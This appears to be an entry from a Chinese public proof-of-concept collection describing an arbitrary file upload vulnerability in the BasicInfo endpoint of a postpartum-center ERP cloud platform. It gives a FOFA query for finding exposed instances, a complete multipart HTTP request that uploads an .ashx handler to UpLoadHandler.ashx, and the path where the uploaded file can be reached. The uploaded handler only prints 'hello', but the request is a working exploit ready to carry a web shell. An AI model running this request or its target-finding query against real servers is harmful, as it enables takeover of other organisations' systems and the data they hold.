# 月子会所ERP管理云平台BasicInfo任意文件上传漏洞

# 一、漏洞简介
月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，BasicInfo接口可上传任意文件，攻击者可利用该漏洞获取服务器控制权。

# 二、影响版本
+ 月子会所ERP管理云平台

# 三、资产测绘
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面


# 四、漏洞复现
```plain
POST /Page/BasicInfo/ashx/UpLoadHandler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 481
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--

```


根据响应拼接上传地址

```plain
/UploadBaseFolder/Contact/2309259440240.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gfk4yt1xarmph0m3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
